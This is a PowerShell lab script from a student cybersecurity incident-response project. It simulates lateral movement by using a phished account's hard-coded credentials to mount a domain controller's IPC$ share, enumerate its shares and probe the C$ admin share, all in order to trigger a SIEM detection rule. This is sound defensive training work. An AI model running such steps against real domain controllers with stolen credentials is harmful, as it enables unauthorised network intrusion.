<#
=====================================================================
 movimiento-lateral.ps1
 ---------------------------------------------------------------------
 Proyecto : TP Gestion de un incidente de ciberseguridad (Nexora S.L.)
 Autor    : Luis Fernando Arrosquipa (GitHub: Fer1399)
 Apartado : 3 - Investigacion / movimiento lateral

 Demuestra el MOVIMIENTO LATERAL con credenciales robadas: usa las
 credenciales de dominio de la cuenta comprometida en el phishing (rrhh.ana) para
 autenticarse desde PC-RRHH-01 contra el controlador de dominio
 DC-NEXORA. Esto genera en el DC un inicio de sesion 4624 (tipo 3,
 por red) a nombre de rrhh.ana y con origen la IP de la victima
 (10.10.10.50). La regla 100203 esta pensada para correlacionar ese
 evento; su disparo automatico como alerta requiere afinar el decoder
 en el gestor (ver apartado 3.8).

 NO es malware: usa herramientas nativas de Windows (net use / net view).
 MITRE: T1078 (Valid Accounts) + T1021.002 (SMB/Windows Admin Shares).

 ENTORNO: laboratorio aislado. Credenciales FICTICIAS de demostracion.
 USO (PowerShell en PC-RRHH-01):
     .\movimiento-lateral.ps1 -DC 10.10.10.10
=====================================================================
#>
param(
    [string]$DC       = "10.10.10.10",
    [string]$Usuario  = "NEXORA\rrhh.ana",
    [string]$Password = "Hola_1234"   # contrasena de dominio de la cuenta comprometida rrhh.ana
)

Write-Host "==== Movimiento lateral con credenciales robadas ====" -ForegroundColor Cyan
Write-Host "[*] Autenticando contra el DC $DC como $Usuario ..." -ForegroundColor Yellow

# 1) Montar el recurso administrativo del DC con las credenciales comprometidas.
#    Esto provoca el inicio de sesion 4624 (tipo 3) en el DC.
net use "\\$DC\IPC$" /user:$Usuario $Password

# 2) Reconocimiento con credenciales validas: recursos del DC.
Write-Host "`n[*] Enumerando recursos compartidos del DC:" -ForegroundColor Yellow
net view "\\$DC"

# 3) Intento de acceso al recurso ADMINISTRATIVO C$ y comprobacion EXPLICITA del
#    resultado. Autenticarse (paso 1) NO implica acceso privilegiado: con una
#    cuenta de dominio sin derechos de administrador, esto debe denegarse.
Write-Host "`n[*] Intentando acceder al recurso administrativo \\$DC\C$ :" -ForegroundColor Yellow
cmd /c "dir \\$DC\C$" > $null 2>&1
if ($LASTEXITCODE -eq 0) {
    Write-Host "    [!] ACCESO CONCEDIDO a C$ (la cuenta tiene privilegios administrativos)" -ForegroundColor Red
} else {
    Write-Host "    [i] ACCESO DENEGADO a C$ (esperado: rrhh.ana no es administrador)." -ForegroundColor DarkGray
    Write-Host "        La autenticacion de red es valida, pero no concede acceso al administrativo." -ForegroundColor DarkGray
}

# 4) Limpieza de la conexion.
net use "\\$DC\IPC$" /delete 2>$null

Write-Host "`n[+] Hecho." -ForegroundColor Green
Write-Host "    En el DC (registro de Seguridad): evento 4624 (tipo 3) de rrhh.ana desde 10.10.10.50." -ForegroundColor Green
Write-Host "    Regla Wazuh 100203: saltaria como alerta SOLO si el DC reenvia su canal Security al SIEM." -ForegroundColor Green
